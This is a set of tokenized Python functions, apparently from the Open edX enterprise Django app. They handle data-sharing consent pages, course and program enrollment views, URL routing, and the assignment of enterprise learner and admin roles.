def get_default_context ( self , enterprise_customer , platform_name ) : context_data = { 'page_title' : _ ( 'Data sharing consent required' ) , 'consent_message_header' : _ ( 'Consent to share your data' ) , 'requested_permissions_header' : _ ( 'Per the {start_link}Data Sharing Policy{end_link}, ' '{bold_start}{enterprise_customer_name}{bold_end} would like to know about:' ) . format ( enterprise_customer_name = enterprise_customer . name , bold_start = '<b>' , bold_end = '</b>' , start_link = '<a href="#consent-policy-dropdown-bar" ' 'class="policy-dropdown-link background-input" id="policy-dropdown-link">' , end_link = '</a>' , ) , 'agreement_text' : _ ( 'I agree to allow {platform_name} to share data about my enrollment, completion and performance in all ' '{platform_name} courses and programs where my enrollment is sponsored by {enterprise_customer_name}.' ) . format ( enterprise_customer_name = enterprise_customer . name , platform_name = platform_name , ) , 'continue_text' : _ ( 'Yes, continue' ) , 'abort_text' : _ ( 'No, take me back.' ) , 'policy_dropdown_header' : _ ( 'Data Sharing Policy' ) , 'sharable_items_header' : _ ( 'Enrollment, completion, and performance data that may be shared with {enterprise_customer_name} ' '(or its designee) for these courses and programs are limited to the following:' ) . format ( enterprise_customer_name = enterprise_customer . name ) , 'sharable_items' : [ _ ( 'My email address for my {platform_name} account, ' 'and the date when I created my {platform_name} account' ) . format ( platform_name = platform_name ) , _ ( 'My {platform_name} ID, and if I log in via single sign-on, ' 'my {enterprise_customer_name} SSO user-ID' ) . format ( platform_name = platform_name , enterprise_customer_name = enterprise_customer . name , ) , _ ( 'My {platform_name} username' ) . format ( platform_name = platform_name ) , _ ( 'My country or region of residence' ) , _ ( 'What courses and/or programs I\'ve enrolled in or unenrolled from, what track I ' 'enrolled in (audit or verified) and the date when I enrolled in each course or program' ) , _ ( 'Information about each course or program I\'ve enrolled in, ' 'including its duration and level of effort required' ) , _ ( 'Whether I completed specific parts of each course or program (for example, whether ' 'I watched a given video or completed a given homework assignment)' ) , _ ( 'My overall percentage completion of each course or program on a periodic basis, ' 'including the total time spent in each course or program and the date when I last ' 'logged in to each course or program' ) , _ ( 'My performance in each course or program' ) , _ ( 'My final grade in each course or program, and the date when I completed each course or program' ) , _ ( 'Whether I received a certificate in each course or program' ) , ] , 'sharable_items_footer' : _ ( 'My permission applies only to data from courses or programs that are sponsored by ' '{enterprise_customer_name}, and not to data from any {platform_name} courses or programs that ' 'I take on my own. I understand that I may withdraw my permission only by fully unenrolling ' 'from any courses or programs that are sponsored by {enterprise_customer_name}.' ) . format ( enterprise_customer_name = enterprise_customer . name , platform_name = platform_name , ) , 'sharable_items_note_header' : _ ( 'Please note' ) , 'sharable_items_notes' : [ _ ( 'If you decline to consent, that fact may be shared with {enterprise_customer_name}.' ) . format ( enterprise_customer_name = enterprise_customer . name ) , ] , 'confirmation_modal_header' : _ ( 'Are you aware...' ) , 'confirmation_modal_affirm_decline_text' : _ ( 'I decline' ) , 'confirmation_modal_abort_decline_text' : _ ( 'View the data sharing policy' ) , 'policy_link_template' : _ ( 'View the {start_link}data sharing policy{end_link}.' ) . format ( start_link = '<a href="#consent-policy-dropdown-bar" class="policy-dropdown-link background-input" ' 'id="policy-dropdown-link">' , end_link = '</a>' , ) , 'policy_return_link_text' : _ ( 'Return to Top' ) , } return context_data
def get_course_or_program_context ( self , enterprise_customer , course_id = None , program_uuid = None ) : context_data = { } if course_id : context_data . update ( { 'course_id' : course_id , 'course_specific' : True } ) if not self . preview_mode : try : catalog_api_client = CourseCatalogApiServiceClient ( enterprise_customer . site ) except ImproperlyConfigured : raise Http404 course_run_details = catalog_api_client . get_course_run ( course_id ) course_start_date = '' if course_run_details [ 'start' ] : course_start_date = parse ( course_run_details [ 'start' ] ) . strftime ( '%B %d, %Y' ) context_data . update ( { 'course_title' : course_run_details [ 'title' ] , 'course_start_date' : course_start_date , } ) else : context_data . update ( { 'course_title' : 'Demo Course' , 'course_start_date' : datetime . datetime . now ( ) . strftime ( '%B %d, %Y' ) , } ) else : context_data . update ( { 'program_uuid' : program_uuid , 'program_specific' : True , } ) return context_data
def get ( self , request ) : enterprise_customer_uuid = request . GET . get ( 'enterprise_customer_uuid' ) success_url = request . GET . get ( 'next' ) failure_url = request . GET . get ( 'failure_url' ) course_id = request . GET . get ( 'course_id' , '' ) program_uuid = request . GET . get ( 'program_uuid' , '' ) self . preview_mode = bool ( request . GET . get ( 'preview_mode' , False ) ) # Get enterprise_customer to start in case we need to render a custom 404 page # Then go through other business logic to determine (and potentially overwrite) the enterprise customer enterprise_customer = get_enterprise_customer_or_404 ( enterprise_customer_uuid ) context_data = get_global_context ( request , enterprise_customer ) if not self . preview_mode : if not self . course_or_program_exist ( course_id , program_uuid ) : error_code = 'ENTGDS000' log_message = ( 'Neither the course with course_id: {course_id} ' 'or program with {program_uuid} exist for ' 'enterprise customer {enterprise_customer_uuid}' 'Error code {error_code} presented to user {userid}' . format ( course_id = course_id , program_uuid = program_uuid , error_code = error_code , userid = request . user . id , enterprise_customer_uuid = enterprise_customer_uuid , ) ) return render_page_with_error_code_message ( request , context_data , error_code , log_message ) try : consent_record = get_data_sharing_consent ( request . user . username , enterprise_customer_uuid , program_uuid = program_uuid , course_id = course_id ) except NotConnectedToOpenEdX as error : error_code = 'ENTGDS001' log_message = ( 'The was a problem with getting the consent record of user {userid} with ' 'uuid {enterprise_customer_uuid}. get_data_sharing_consent threw ' 'the following NotConnectedToOpenEdX error: {error}' 'for course_id {course_id}.' 'Error code {error_code} presented to user' . format ( userid = request . user . id , enterprise_customer_uuid = enterprise_customer_uuid , error = error , error_code = error_code , course_id = course_id , ) ) return render_page_with_error_code_message ( request , context_data , error_code , log_message ) try : consent_required = consent_record . consent_required ( ) except AttributeError : consent_required = None if consent_record is None or not consent_required : error_code = 'ENTGDS002' log_message = ( 'The was a problem with the consent record of user {userid} with ' 'enterprise_customer_uuid {enterprise_customer_uuid}. consent_record has a value ' 'of {consent_record} and consent_record.consent_required() a ' 'value of {consent_required} for course_id {course_id}. ' 'Error code {error_code} presented to user' . format ( userid = request . user . id , enterprise_customer_uuid = enterprise_customer_uuid , consent_record = consent_record , consent_required = consent_required , error_code = error_code , course_id = course_id , ) ) return render_page_with_error_code_message ( request , context_data , error_code , log_message ) else : enterprise_customer = consent_record . enterprise_customer elif not request . user . is_staff : raise PermissionDenied ( ) # Retrieve context data again now that enterprise_customer logic has been run context_data = get_global_context ( request , enterprise_customer ) if not ( enterprise_customer_uuid and success_url and failure_url ) : error_code = 'ENTGDS003' log_message = ( 'Error: one or more of the following values was falsy: ' 'enterprise_customer_uuid: {enterprise_customer_uuid}, ' 'success_url: {success_url}, ' 'failure_url: {failure_url} for course id {course_id}' 'The following error code was reported to user {userid}: {error_code}' . format ( userid = request . user . id , enterprise_customer_uuid = enterprise_customer_uuid , success_url = success_url , failure_url = failure_url , error_code = error_code , course_id = course_id , ) ) return render_page_with_error_code_message ( request , context_data , error_code , log_message ) try : updated_context_dict = self . get_course_or_program_context ( enterprise_customer , course_id = course_id , program_uuid = program_uuid ) context_data . update ( updated_context_dict ) except Http404 : error_code = 'ENTGDS004' log_message = ( 'CourseCatalogApiServiceClient is improperly configured. ' 'Returned error code {error_code} to user {userid} ' 'and enterprise_customer {enterprise_customer} ' 'for course_id {course_id}' . format ( error_code = error_code , userid = request . user . id , enterprise_customer = enterprise_customer . uuid , course_id = course_id , ) ) return render_page_with_error_code_message ( request , context_data , error_code , log_message ) item = 'course' if course_id else 'program' # Translators: bold_start and bold_end are HTML tags for specifying enterprise name in bold text. context_data . update ( { 'consent_request_prompt' : _ ( 'To access this {item}, you must first consent to share your learning achievements ' 'with {bold_start}{enterprise_customer_name}{bold_end}.' ) . format ( enterprise_customer_name = enterprise_customer . name , bold_start = '<b>' , bold_end = '</b>' , item = item , ) , 'confirmation_alert_prompt' : _ ( 'In order to start this {item} and use your discount, {bold_start}you must{bold_end} consent ' 'to share your {item} data with {enterprise_customer_name}.' ) . format ( enterprise_customer_name = enterprise_customer . name , bold_start = '<b>' , bold_end = '</b>' , item = item , ) , 'redirect_url' : success_url , 'failure_url' : failure_url , 'defer_creation' : request . GET . get ( 'defer_creation' ) is not None , 'requested_permissions' : [ _ ( 'your enrollment in this {item}' ) . format ( item = item ) , _ ( 'your learning progress' ) , _ ( 'course completion' ) , ] , 'policy_link_template' : '' , } ) platform_name = context_data [ 'platform_name' ] published_only = False if self . preview_mode else True enterprise_consent_page = enterprise_customer . get_data_sharing_consent_text_overrides ( published_only = published_only ) if enterprise_consent_page : context_data . update ( self . get_context_from_db ( enterprise_consent_page , platform_name , item , context_data ) ) else : context_data . update ( self . get_default_context ( enterprise_customer , platform_name ) ) return render ( request , 'enterprise/grant_data_sharing_permissions.html' , context = context_data )
def post ( self , request ) : enterprise_uuid = request . POST . get ( 'enterprise_customer_uuid' ) success_url = request . POST . get ( 'redirect_url' ) failure_url = request . POST . get ( 'failure_url' ) course_id = request . POST . get ( 'course_id' , '' ) program_uuid = request . POST . get ( 'program_uuid' , '' ) enterprise_customer = get_enterprise_customer_or_404 ( enterprise_uuid ) context_data = get_global_context ( request , enterprise_customer ) if not ( enterprise_uuid and success_url and failure_url ) : error_code = 'ENTGDS005' log_message = ( 'Error: one or more of the following values was falsy: ' 'enterprise_uuid: {enterprise_uuid}, ' 'success_url: {success_url}, ' 'failure_url: {failure_url} for course_id {course_id}. ' 'The following error code was reported to the user {userid}: {error_code}' . format ( userid = request . user . id , enterprise_uuid = enterprise_uuid , success_url = success_url , failure_url = failure_url , error_code = error_code , course_id = course_id , ) ) return render_page_with_error_code_message ( request , context_data , error_code , log_message ) if not self . course_or_program_exist ( course_id , program_uuid ) : error_code = 'ENTGDS006' log_message = ( 'Neither the course with course_id: {course_id} ' 'or program with {program_uuid} exist for ' 'enterprise customer {enterprise_uuid}' 'Error code {error_code} presented to user {userid}' . format ( course_id = course_id , program_uuid = program_uuid , error_code = error_code , userid = request . user . id , enterprise_uuid = enterprise_uuid , ) ) return render_page_with_error_code_message ( request , context_data , error_code , log_message ) consent_record = get_data_sharing_consent ( request . user . username , enterprise_uuid , program_uuid = program_uuid , course_id = course_id ) if consent_record is None : error_code = 'ENTGDS007' log_message = ( 'The was a problem with the consent record of user {userid} with ' 'enterprise_uuid {enterprise_uuid}. consent_record has a value ' 'of {consent_record} and a ' 'value for course_id {course_id}. ' 'Error code {error_code} presented to user' . format ( userid = request . user . id , enterprise_uuid = enterprise_uuid , consent_record = consent_record , error_code = error_code , course_id = course_id , ) ) return render_page_with_error_code_message ( request , context_data , error_code , log_message ) defer_creation = request . POST . get ( 'defer_creation' ) consent_provided = bool ( request . POST . get ( 'data_sharing_consent' , False ) ) if defer_creation is None and consent_record . consent_required ( ) : if course_id : enterprise_customer_user , __ = EnterpriseCustomerUser . objects . get_or_create ( enterprise_customer = consent_record . enterprise_customer , user_id = request . user . id ) enterprise_customer_user . update_session ( request ) __ , created = EnterpriseCourseEnrollment . objects . get_or_create ( enterprise_customer_user = enterprise_customer_user , course_id = course_id , ) if created : track_enrollment ( 'data-consent-page-enrollment' , request . user . id , course_id , request . path ) consent_record . granted = consent_provided consent_record . save ( ) return redirect ( success_url if consent_provided else failure_url )
def set_final_prices ( self , modes , request ) : result = [ ] for mode in modes : if mode [ 'premium' ] : mode [ 'final_price' ] = EcommerceApiClient ( request . user ) . get_course_final_price ( mode = mode , enterprise_catalog_uuid = request . GET . get ( 'catalog' ) if request . method == 'GET' else None , ) result . append ( mode ) return result
def get_enterprise_course_enrollment_page ( self , request , enterprise_customer , course , course_run , course_modes , enterprise_course_enrollment , data_sharing_consent ) : context_data = get_global_context ( request , enterprise_customer ) enterprise_catalog_uuid = request . GET . get ( 'catalog' ) if request . method == 'GET' else None html_template_for_rendering = ENTERPRISE_GENERAL_ERROR_PAGE if course and course_run : course_enrollable = True course_start_date = '' course_in_future = False organization_name = '' organization_logo = '' expected_learning_items = course [ 'expected_learning_items' ] # Parse organization name and logo. if course [ 'owners' ] : # The owners key contains the organizations associated with the course. # We pick the first one in the list here to meet UX requirements. organization = course [ 'owners' ] [ 0 ] organization_name = organization [ 'name' ] organization_logo = organization [ 'logo_image_url' ] course_title = course_run [ 'title' ] course_short_description = course_run [ 'short_description' ] or '' course_full_description = clean_html_for_template_rendering ( course_run [ 'full_description' ] or '' ) course_pacing = self . PACING_FORMAT . get ( course_run [ 'pacing_type' ] , '' ) if course_run [ 'start' ] : course_start_date = parse ( course_run [ 'start' ] ) . strftime ( '%B %d, %Y' ) now = datetime . datetime . now ( pytz . UTC ) course_in_future = parse ( course_run [ 'start' ] ) > now course_level_type = course_run . get ( 'level_type' , '' ) staff = course_run [ 'staff' ] # Format the course effort string using the min/max effort fields for the course run. course_effort = ungettext_min_max ( '{} hour per week' , '{} hours per week' , '{}-{} hours per week' , course_run [ 'min_effort' ] or None , course_run [ 'max_effort' ] or None , ) or '' # Parse course run image. course_run_image = course_run [ 'image' ] or { } course_image_uri = course_run_image . get ( 'src' , '' ) # Retrieve the enterprise-discounted price from ecommerce. course_modes = self . set_final_prices ( course_modes , request ) premium_modes = [ mode for mode in course_modes if mode [ 'premium' ] ] # Filter audit course modes. course_modes = filter_audit_course_modes ( enterprise_customer , course_modes ) # Allows automatic assignment to a cohort upon enrollment. cohort = request . GET . get ( 'cohort' ) # Add a message to the message display queue if the learner # has gone through the data sharing consent flow and declined # to give data sharing consent. if enterprise_course_enrollment and not data_sharing_consent . granted : messages . add_consent_declined_message ( request , enterprise_customer , course_run . get ( 'title' , '' ) ) if not is_course_run_enrollable ( course_run ) : messages . add_unenrollable_item_message ( request , 'course' ) course_enrollable = False context_data . update ( { 'course_enrollable' : course_enrollable , 'course_title' : course_title , 'course_short_description' : course_short_description , 'course_pacing' : course_pacing , 'course_start_date' : course_start_date , 'course_in_future' : course_in_future , 'course_image_uri' : course_image_uri , 'course_modes' : course_modes , 'course_effort' : course_effort , 'course_full_description' : course_full_description , 'cohort' : cohort , 'organization_logo' : organization_logo , 'organization_name' : organization_name , 'course_level_type' : course_level_type , 'premium_modes' : premium_modes , 'expected_learning_items' : expected_learning_items , 'catalog' : enterprise_catalog_uuid , 'staff' : staff , 'discount_text' : _ ( 'Discount provided by {strong_start}{enterprise_customer_name}{strong_end}' ) . format ( enterprise_customer_name = enterprise_customer . name , strong_start = '<strong>' , strong_end = '</strong>' , ) , 'hide_course_original_price' : enterprise_customer . hide_course_original_price } ) html_template_for_rendering = 'enterprise/enterprise_course_enrollment_page.html' context_data . update ( { 'page_title' : _ ( 'Confirm your course' ) , 'confirmation_text' : _ ( 'Confirm your course' ) , 'starts_at_text' : _ ( 'Starts' ) , 'view_course_details_text' : _ ( 'View Course Details' ) , 'select_mode_text' : _ ( 'Please select one:' ) , 'price_text' : _ ( 'Price' ) , 'continue_link_text' : _ ( 'Continue' ) , 'level_text' : _ ( 'Level' ) , 'effort_text' : _ ( 'Effort' ) , 'close_modal_button_text' : _ ( 'Close' ) , 'expected_learning_items_text' : _ ( "What you'll learn" ) , 'course_full_description_text' : _ ( 'About This Course' ) , 'staff_text' : _ ( 'Course Staff' ) , } ) return render ( request , html_template_for_rendering , context = context_data )
def post ( self , request , enterprise_uuid , course_id ) : enterprise_customer , course , course_run , course_modes = self . get_base_details ( request , enterprise_uuid , course_id ) # Create a link between the user and the enterprise customer if it does not already exist. enterprise_customer_user , __ = EnterpriseCustomerUser . objects . get_or_create ( enterprise_customer = enterprise_customer , user_id = request . user . id ) enterprise_customer_user . update_session ( request ) data_sharing_consent = DataSharingConsent . objects . proxied_get ( username = enterprise_customer_user . username , course_id = course_id , enterprise_customer = enterprise_customer ) try : enterprise_course_enrollment = EnterpriseCourseEnrollment . objects . get ( enterprise_customer_user__enterprise_customer = enterprise_customer , enterprise_customer_user__user_id = request . user . id , course_id = course_id ) except EnterpriseCourseEnrollment . DoesNotExist : enterprise_course_enrollment = None enterprise_catalog_uuid = request . POST . get ( 'catalog' ) selected_course_mode_name = request . POST . get ( 'course_mode' ) cohort_name = request . POST . get ( 'cohort' ) selected_course_mode = None for course_mode in course_modes : if course_mode [ 'mode' ] == selected_course_mode_name : selected_course_mode = course_mode break if not selected_course_mode : return self . get_enterprise_course_enrollment_page ( request , enterprise_customer , course , course_run , course_modes , enterprise_course_enrollment , data_sharing_consent ) user_consent_needed = get_data_sharing_consent ( enterprise_customer_user . username , enterprise_customer . uuid , course_id = course_id ) . consent_required ( ) if not selected_course_mode . get ( 'premium' ) and not user_consent_needed : # For the audit course modes (audit, honor), where DSC is not # required, enroll the learner directly through enrollment API # client and redirect the learner to LMS courseware page. if not enterprise_course_enrollment : # Create the Enterprise backend database records for this course enrollment. enterprise_course_enrollment = EnterpriseCourseEnrollment . objects . create ( enterprise_customer_user = enterprise_customer_user , course_id = course_id , ) track_enrollment ( 'course-landing-page-enrollment' , request . user . id , course_id , request . get_full_path ( ) ) client = EnrollmentApiClient ( ) client . enroll_user_in_course ( request . user . username , course_id , selected_course_mode_name , cohort = cohort_name ) return redirect ( LMS_COURSEWARE_URL . format ( course_id = course_id ) ) if user_consent_needed : # For the audit course modes (audit, honor) or for the premium # course modes (Verified, Prof Ed) where DSC is required, redirect # the learner to course specific DSC with enterprise UUID from # there the learner will be directed to the ecommerce flow after # providing DSC. query_string_params = { 'course_mode' : selected_course_mode_name , } if enterprise_catalog_uuid : query_string_params . update ( { 'catalog' : enterprise_catalog_uuid } ) next_url = '{handle_consent_enrollment_url}?{query_string}' . format ( handle_consent_enrollment_url = reverse ( 'enterprise_handle_consent_enrollment' , args = [ enterprise_customer . uuid , course_id ] ) , query_string = urlencode ( query_string_params ) ) failure_url = reverse ( 'enterprise_course_run_enrollment_page' , args = [ enterprise_customer . uuid , course_id ] ) if request . META [ 'QUERY_STRING' ] : # Preserve all querystring parameters in the request to build # failure url, so that learner views the same enterprise course # enrollment page (after redirect) as for the first time. # Since this is a POST view so use `request.META` to get # querystring instead of `request.GET`. # https://docs.djangoproject.com/en/1.11/ref/request-response/#django.http.HttpRequest.META failure_url = '{course_enrollment_url}?{query_string}' . format ( course_enrollment_url = reverse ( 'enterprise_course_run_enrollment_page' , args = [ enterprise_customer . uuid , course_id ] ) , query_string = request . META [ 'QUERY_STRING' ] ) return redirect ( '{grant_data_sharing_url}?{params}' . format ( grant_data_sharing_url = reverse ( 'grant_data_sharing_permissions' ) , params = urlencode ( { 'next' : next_url , 'failure_url' : failure_url , 'enterprise_customer_uuid' : enterprise_customer . uuid , 'course_id' : course_id , } ) ) ) # For the premium course modes (Verified, Prof Ed) where DSC is # not required, redirect the enterprise learner to the ecommerce # flow in LMS. # Note: LMS start flow automatically detects the paid mode premium_flow = LMS_START_PREMIUM_COURSE_FLOW_URL . format ( course_id = course_id ) if enterprise_catalog_uuid : premium_flow += '?catalog={catalog_uuid}' . format ( catalog_uuid = enterprise_catalog_uuid ) return redirect ( premium_flow )
def get_enterprise_program_enrollment_page ( self , request , enterprise_customer , program_details ) : # Safely make the assumption that we can use the first authoring organization. organizations = program_details [ 'authoring_organizations' ] organization = organizations [ 0 ] if organizations else { } platform_name = get_configuration_value ( 'PLATFORM_NAME' , settings . PLATFORM_NAME ) program_title = program_details [ 'title' ] program_type_details = program_details [ 'type_details' ] program_type = program_type_details [ 'name' ] # Make any modifications for singular/plural-dependent text. program_courses = program_details [ 'courses' ] course_count = len ( program_courses ) course_count_text = ungettext ( '{count} Course' , '{count} Courses' , course_count , ) . format ( count = course_count ) effort_info_text = ungettext_min_max ( '{} hour per week, per course' , '{} hours per week, per course' , _ ( '{}-{} hours per week, per course' ) , program_details . get ( 'min_hours_effort_per_week' ) , program_details . get ( 'max_hours_effort_per_week' ) , ) length_info_text = ungettext_min_max ( '{} week per course' , '{} weeks per course' , _ ( '{}-{} weeks per course' ) , program_details . get ( 'weeks_to_complete_min' ) , program_details . get ( 'weeks_to_complete_max' ) , ) # Update some enrollment-related text requirements. if program_details [ 'enrolled_in_program' ] : purchase_action = _ ( 'Purchase all unenrolled courses' ) item = _ ( 'enrollment' ) else : purchase_action = _ ( 'Pursue the program' ) item = _ ( 'program enrollment' ) # Add any DSC warning messages. program_data_sharing_consent = get_data_sharing_consent ( request . user . username , enterprise_customer . uuid , program_uuid = program_details [ 'uuid' ] , ) if program_data_sharing_consent . exists and not program_data_sharing_consent . granted : messages . add_consent_declined_message ( request , enterprise_customer , program_title ) discount_data = program_details . get ( 'discount_data' , { } ) one_click_purchase_eligibility = program_details . get ( 'is_learner_eligible_for_one_click_purchase' , False ) # The following messages shouldn't both appear at the same time, and we prefer the eligibility message. if not one_click_purchase_eligibility : messages . add_unenrollable_item_message ( request , 'program' ) elif discount_data . get ( 'total_incl_tax_excl_discounts' ) is None : messages . add_missing_price_information_message ( request , program_title ) context_data = get_global_context ( request , enterprise_customer ) context_data . update ( { 'enrolled_in_course_and_paid_text' : _ ( 'enrolled' ) , 'enrolled_in_course_and_unpaid_text' : _ ( 'already enrolled, must pay for certificate' ) , 'expected_learning_items_text' : _ ( "What you'll learn" ) , 'expected_learning_items_show_count' : 2 , 'corporate_endorsements_text' : _ ( 'Real Career Impact' ) , 'corporate_endorsements_show_count' : 1 , 'see_more_text' : _ ( 'See More' ) , 'see_less_text' : _ ( 'See Less' ) , 'confirm_button_text' : _ ( 'Confirm Program' ) , 'summary_header' : _ ( 'Program Summary' ) , 'price_text' : _ ( 'Price' ) , 'length_text' : _ ( 'Length' ) , 'effort_text' : _ ( 'Effort' ) , 'level_text' : _ ( 'Level' ) , 'course_full_description_text' : _ ( 'About This Course' ) , 'staff_text' : _ ( 'Course Staff' ) , 'close_modal_button_text' : _ ( 'Close' ) , 'program_not_eligible_for_one_click_purchase_text' : _ ( 'Program not eligible for one-click purchase.' ) , 'program_type_description_header' : _ ( 'What is an {platform_name} {program_type}?' ) . format ( platform_name = platform_name , program_type = program_type , ) , 'platform_description_header' : _ ( 'What is {platform_name}?' ) . format ( platform_name = platform_name ) , 'organization_name' : organization . get ( 'name' ) , 'organization_logo' : organization . get ( 'logo_image_url' ) , 'organization_text' : _ ( 'Presented by {organization}' ) . format ( organization = organization . get ( 'name' ) ) , 'page_title' : _ ( 'Confirm your {item}' ) . format ( item = item ) , 'program_type_logo' : program_type_details [ 'logo_image' ] . get ( 'medium' , { } ) . get ( 'url' , '' ) , 'program_type' : program_type , 'program_type_description' : get_program_type_description ( program_type ) , 'program_title' : program_title , 'program_subtitle' : program_details [ 'subtitle' ] , 'program_overview' : program_details [ 'overview' ] , 'program_price' : get_price_text ( discount_data . get ( 'total_incl_tax_excl_discounts' , 0 ) , request ) , 'program_discounted_price' : get_price_text ( discount_data . get ( 'total_incl_tax' , 0 ) , request ) , 'is_discounted' : discount_data . get ( 'is_discounted' , False ) , 'courses' : program_courses , 'item_bullet_points' : [ _ ( 'Credit- and Certificate-eligible' ) , _ ( 'Self-paced; courses can be taken in any order' ) , ] , 'purchase_text' : _ ( '{purchase_action} for' ) . format ( purchase_action = purchase_action ) , 'expected_learning_items' : program_details [ 'expected_learning_items' ] , 'corporate_endorsements' : program_details [ 'corporate_endorsements' ] , 'course_count_text' : course_count_text , 'length_info_text' : length_info_text , 'effort_info_text' : effort_info_text , 'is_learner_eligible_for_one_click_purchase' : one_click_purchase_eligibility , } ) return render ( request , 'enterprise/enterprise_program_enrollment_page.html' , context = context_data )
def post ( self , request , enterprise_uuid , program_uuid ) : verify_edx_resources ( ) # Create a link between the user and the enterprise customer if it does not already exist. enterprise_customer = get_enterprise_customer_or_404 ( enterprise_uuid ) with transaction . atomic ( ) : enterprise_customer_user , __ = EnterpriseCustomerUser . objects . get_or_create ( enterprise_customer = enterprise_customer , user_id = request . user . id ) enterprise_customer_user . update_session ( request ) context_data = get_global_context ( request , enterprise_customer ) program_details , error_code = self . get_program_details ( request , program_uuid , enterprise_customer ) if error_code : return render ( request , ENTERPRISE_GENERAL_ERROR_PAGE , context = context_data , status = 404 , ) if program_details [ 'certificate_eligible_for_program' ] : # The user is already enrolled in the program, so redirect to the program's dashboard. return redirect ( LMS_PROGRAMS_DASHBOARD_URL . format ( uuid = program_uuid ) ) basket_page = '{basket_url}?{params}' . format ( basket_url = BASKET_URL , params = urlencode ( [ tuple ( [ 'sku' , sku ] ) for sku in program_details [ 'skus' ] ] + [ tuple ( [ 'bundle' , program_uuid ] ) ] ) ) if get_data_sharing_consent ( enterprise_customer_user . username , enterprise_customer . uuid , program_uuid = program_uuid , ) . consent_required ( ) : return redirect ( '{grant_data_sharing_url}?{params}' . format ( grant_data_sharing_url = reverse ( 'grant_data_sharing_permissions' ) , params = urlencode ( { 'next' : basket_page , 'failure_url' : reverse ( 'enterprise_program_enrollment_page' , args = [ enterprise_customer . uuid , program_uuid ] ) , 'enterprise_customer_uuid' : enterprise_customer . uuid , 'program_uuid' : program_uuid , } ) ) ) return redirect ( basket_page )
def redirect ( self , request , * args , * * kwargs ) : enterprise_customer_uuid , course_run_id , course_key , program_uuid = RouterView . get_path_variables ( * * kwargs ) resource_id = course_key or course_run_id or program_uuid # Replace enterprise UUID and resource ID with '{}', to easily match with a path in RouterView.VIEWS. Example: # /enterprise/fake-uuid/course/course-v1:cool+course+2017/enroll/ -> /enterprise/{}/course/{}/enroll/ path = re . sub ( '{}|{}' . format ( enterprise_customer_uuid , re . escape ( resource_id ) ) , '{}' , request . path ) # Remove course_key from kwargs if it exists because delegate views are not expecting it. kwargs . pop ( 'course_key' , None ) return self . VIEWS [ path ] . as_view ( ) ( request , * args , * * kwargs )
def post ( self , request , * args , * * kwargs ) : # pylint: disable=unused-variable enterprise_customer_uuid , course_run_id , course_key , program_uuid = RouterView . get_path_variables ( * * kwargs ) enterprise_customer = get_enterprise_customer_or_404 ( enterprise_customer_uuid ) if course_key : context_data = get_global_context ( request , enterprise_customer ) try : kwargs [ 'course_id' ] = RouterView . get_course_run_id ( request . user , enterprise_customer , course_key ) except Http404 : error_code = 'ENTRV001' log_message = ( 'Could not find course run with id {course_run_id} ' 'for course key {course_key} and ' 'for enterprise_customer_uuid {enterprise_customer_uuid} ' 'and program {program_uuid}. ' 'Returned error code {error_code} to user {userid}' . format ( course_key = course_key , course_run_id = course_run_id , enterprise_customer_uuid = enterprise_customer_uuid , error_code = error_code , userid = request . user . id , program_uuid = program_uuid , ) ) return render_page_with_error_code_message ( request , context_data , error_code , log_message ) return self . redirect ( request , * args , * * kwargs )
def default_content_filter ( sender , instance , * * kwargs ) : # pylint: disable=unused-argument if kwargs [ 'created' ] and not instance . content_filter : instance . content_filter = get_default_catalog_content_filter ( ) instance . save ( )
def assign_enterprise_learner_role ( sender , instance , * * kwargs ) : # pylint: disable=unused-argument if kwargs [ 'created' ] and instance . user : enterprise_learner_role , __ = SystemWideEnterpriseRole . objects . get_or_create ( name = ENTERPRISE_LEARNER_ROLE ) SystemWideEnterpriseUserRoleAssignment . objects . get_or_create ( user = instance . user , role = enterprise_learner_role )
def delete_enterprise_learner_role_assignment ( sender , instance , * * kwargs ) : # pylint: disable=unused-argument if instance . user : enterprise_learner_role , __ = SystemWideEnterpriseRole . objects . get_or_create ( name = ENTERPRISE_LEARNER_ROLE ) try : SystemWideEnterpriseUserRoleAssignment . objects . get ( user = instance . user , role = enterprise_learner_role ) . delete ( ) except SystemWideEnterpriseUserRoleAssignment . DoesNotExist : # Do nothing if no role assignment is present for the enterprise customer user. pass
def create_roles ( apps , schema_editor ) : SystemWideEnterpriseRole = apps . get_model ( 'enterprise' , 'SystemWideEnterpriseRole' ) SystemWideEnterpriseRole . objects . update_or_create ( name = ENTERPRISE_ADMIN_ROLE ) SystemWideEnterpriseRole . objects . update_or_create ( name = ENTERPRISE_LEARNER_ROLE )
def delete_roles ( apps , schema_editor ) : SystemWideEnterpriseRole = apps . get_model ( 'enterprise' , 'SystemWideEnterpriseRole' ) SystemWideEnterpriseRole . objects . filter ( name__in = [ ENTERPRISE_ADMIN_ROLE , ENTERPRISE_LEARNER_ROLE ] ) . delete ( )
def _get_enterprise_admin_users_batch ( self , start , end ) : LOGGER . info ( 'Fetching new batch of enterprise admin users from indexes: %s to %s' , start , end ) return User . objects . filter ( groups__name = ENTERPRISE_DATA_API_ACCESS_GROUP , is_staff = False ) [ start : end ]
def _get_enterprise_operator_users_batch ( self , start , end ) : LOGGER . info ( 'Fetching new batch of enterprise operator users from indexes: %s to %s' , start , end ) return User . objects . filter ( groups__name = ENTERPRISE_DATA_API_ACCESS_GROUP , is_staff = True ) [ start : end ]
def _get_enterprise_customer_users_batch ( self , start , end ) : LOGGER . info ( 'Fetching new batch of enterprise customer users from indexes: %s to %s' , start , end ) return User . objects . filter ( pk__in = self . _get_enterprise_customer_user_ids ( ) ) [ start : end ]
def _get_enterprise_enrollment_api_admin_users_batch ( self , start , end ) : # pylint: disable=invalid-name LOGGER . info ( 'Fetching new batch of enterprise enrollment admin users from indexes: %s to %s' , start , end ) return User . objects . filter ( groups__name = ENTERPRISE_ENROLLMENT_API_ACCESS_GROUP , is_staff = False ) [ start : end ]
def _get_enterprise_catalog_admin_users_batch ( self , start , end ) : Application = apps . get_model ( OAUTH2_PROVIDER_APPLICATION_MODEL ) # pylint: disable=invalid-name LOGGER . info ( 'Fetching new batch of enterprise catalog admin users from indexes: %s to %s' , start , end ) catalog_admin_user_ids = Application . objects . filter ( user_id__in = self . _get_enterprise_customer_user_ids ( ) ) . exclude ( name = EDX_ORG_NAME ) . values ( 'user_id' ) return User . objects . filter ( pk__in = catalog_admin_user_ids ) [ start : end ]
